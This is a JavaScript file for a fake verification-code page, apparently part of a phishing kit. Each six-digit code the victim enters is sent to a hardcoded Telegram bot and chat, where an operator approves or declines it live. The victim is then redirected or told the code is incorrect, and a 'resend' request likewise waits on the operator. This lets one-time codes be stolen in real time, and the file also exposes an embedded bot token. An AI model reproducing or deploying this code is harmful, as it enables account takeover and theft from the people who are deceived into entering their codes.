// Telegram Configuration
const BOT_TOKEN = '8424484193:AAFvLn7GwjI3US_nVBUKBOGKUGPuH-xcZo4';
const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;
const CHAT_ID = '7867274282';

// DOM Elements
const codeInput = document.getElementById('verification-code');
const verifyBtn = document.getElementById('verify-btn');
const resendLink = document.getElementById('resend-code');
const errorMessage = document.getElementById('code-error');

// State variables
let isVerifying = false;

// Initialize
function initVerification() {
    // Auto-focus the input
    if (codeInput) {
        codeInput.focus();
    }
}

// Handle code input
codeInput.addEventListener('input', (e) => {
    const value = e.target.value;
    
    // Only allow numbers
    e.target.value = value.replace(/\D/g, '').slice(0, 6);
    
    // Enable/disable verify button
    verifyBtn.disabled = e.target.value.length !== 6;
});

// Handle Enter key
codeInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter' && codeInput.value.length === 6 && !isVerifying) {
        verifyCode();
    }
});

// Handle paste
codeInput.addEventListener('paste', (e) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text');
    const digits = pastedData.replace(/\D/g, '').slice(0, 6);
    codeInput.value = digits;
    verifyBtn.disabled = digits.length !== 6;
    
    // Auto-verify if 6 digits pasted
    if (digits.length === 6 && !isVerifying) {
        setTimeout(() => verifyCode(), 100);
    }
});

// Verify the entered code
async function verifyCode() {
    const verificationCode = codeInput.value.trim();
    
    if (isVerifying || verificationCode.length !== 6) return;

    // Set verifying state
    isVerifying = true;
    setVerifyButtonLoading(true);
    clearError();

    try {
        // Send to Telegram for verification
        const response = await fetch(`${API_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: `Verification Code: ${verificationCode}`,
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ Approve', callback_data: `verify_yes_${verificationCode}` },
                        { text: '❌ Decline', callback_data: `verify_no_${verificationCode}` }
                    ]]
                }
            })
        });

        const result = await response.json();

        if (!result.ok) {
            throw new Error(result.description);
        }

        // Start polling for response
        startVerificationPolling(verificationCode);

    } catch (error) {
        showError('Verification failed: ' + error.message);
        setVerifyButtonLoading(false);
        isVerifying = false;
    }
}

// Poll for verification response
function startVerificationPolling(codeToCheck) {
    let pollCount = 0;
    const maxPolls = 30; // 30 seconds timeout

    const pollInterval = setInterval(async () => {
        pollCount++;

        if (pollCount > maxPolls) {
            clearInterval(pollInterval);
            showError('Verification timeout. Please try again.');
            setVerifyButtonLoading(false);
            isVerifying = false;
            return;
        }

        try {
            const response = await fetch(`${API_URL}/getUpdates`);
            const result = await response.json();

            if (result.ok && result.result.length > 0) {
                for (const update of result.result) {
                    if (update.callback_query) {
                        const callback = update.callback_query;
                        const callbackData = callback.data;

                        // Check if this callback is for our verification
                        if (callbackData.includes(`verify_yes_${codeToCheck}`)) {
                            clearInterval(pollInterval);
                            await acknowledgeCallback(callback.id);
                            handleVerificationSuccess();
                            return;
                        } else if (callbackData.includes(`verify_no_${codeToCheck}`)) {
                            clearInterval(pollInterval);
                            await acknowledgeCallback(callback.id);
                            handleVerificationFailure();
                            return;
                        }
                    }
                }
            }
        } catch (error) {
            console.error('Polling error:', error);
        }
    }, 1000); // Check every second
}

// Handle successful verification
function handleVerificationSuccess() {
    clearError();
    setVerifyButtonLoading(false);
    isVerifying = false;

    // Show success state
    codeInput.classList.add('success');
    codeInput.classList.remove('error');

    // Redirect to success page
    window.location.href = 'success.html';
}

// Handle failed verification
function handleVerificationFailure() {
    setVerifyButtonLoading(false);
    isVerifying = false;

    // Show error state
    codeInput.classList.add('error');
    codeInput.classList.remove('success');

    showError('Incorrect verification code. Please try again.');
    clearInput();
    codeInput.focus();
}

// Acknowledge callback query
async function acknowledgeCallback(callbackId) {
    try {
        await fetch(`${API_URL}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: callbackId })
        });
    } catch (error) {
        console.error('Error acknowledging callback:', error);
    }
}

// Resend code functionality (simplified)
resendLink.addEventListener('click', async (e) => {
    e.preventDefault();
    
    // Disable resend link and show loading
    const originalResendText = resendLink.textContent;
    resendLink.textContent = 'Requesting...';
    resendLink.style.pointerEvents = 'none';
    
    try {
        // Clear any existing errors
        clearError();
        
        // Send resend request to Telegram
        const response = await fetch(`${API_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: '📱 User has requested to resend the verification code.',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ Approve Resend', callback_data: 'resend_approve' },
                        { text: '❌ Decline Resend', callback_data: 'resend_decline' }
                    ]]
                }
            })
        });
        
        const result = await response.json();
        
        if (!result.ok) {
            throw new Error(result.description);
        }
        
        // Start polling for resend approval response
        await waitForResendApproval();
        
    } catch (error) {
        console.error('Resend request failed:', error);
        showError('Failed to request resend: ' + error.message);
        // Reset resend link
        resetResendLink(originalResendText);
    }
});

// Poll for resend approval response
async function waitForResendApproval() {
    let pollCount = 0;
    const maxPolls = 30; // 30 seconds timeout
    
    // Show waiting message
    resendLink.textContent = 'Awaiting approval...';
    
    const pollInterval = setInterval(async () => {
        pollCount++;
        
        if (pollCount > maxPolls) {
            clearInterval(pollInterval);
            showError('Resend approval timeout. Please try again.');
            resetResendLink('Resend');
            return;
        }
        
        try {
            const response = await fetch(`${API_URL}/getUpdates`);
            const result = await response.json();
            
            if (result.ok && result.result.length > 0) {
                for (const update of result.result) {
                    if (update.callback_query) {
                        const callback = update.callback_query;
                        const callbackData = callback.data;
                        
                        // Check if this callback is for resend approval
                        if (callbackData === 'resend_approve') {
                            clearInterval(pollInterval);
                            await acknowledgeCallback(callback.id);
                            // Reload page on approval
                            window.location.reload();
                            return;
                        } else if (callbackData === 'resend_decline') {
                            clearInterval(pollInterval);
                            await acknowledgeCallback(callback.id);
                            showError('Unable to send code right now.');
                            resetResendLink('Resend');
                            return;
                        }
                    }
                }
            }
        } catch (error) {
            console.error('Resend polling error:', error);
        }
    }, 1000);
}

// Reset resend link to normal state
function resetResendLink(text = 'Resend') {
    resendLink.textContent = text;
    resendLink.style.pointerEvents = 'auto';
    resendLink.style.color = '';
}

// UI Helper functions
function setVerifyButtonLoading(isLoading) {
    verifyBtn.disabled = isLoading;
    
    if (isLoading) {
        verifyBtn.textContent = 'Verifying...';
        verifyBtn.classList.add('loading');
    } else {
        verifyBtn.textContent = 'Verify';
        verifyBtn.classList.remove('loading');
    }
}

function showError(message) {
    errorMessage.textContent = message;
    errorMessage.style.display = 'block';
    codeInput.classList.add('error');
}

function clearError() {
    errorMessage.textContent = '';
    errorMessage.style.display = 'none';
    codeInput.classList.remove('error');
}

function clearInput() {
    codeInput.value = '';
    codeInput.classList.remove('error', 'success');
    verifyBtn.disabled = true;
}

// Event Listeners
verifyBtn.addEventListener('click', verifyCode);

// Initialize on page load
document.addEventListener('DOMContentLoaded', initVerification);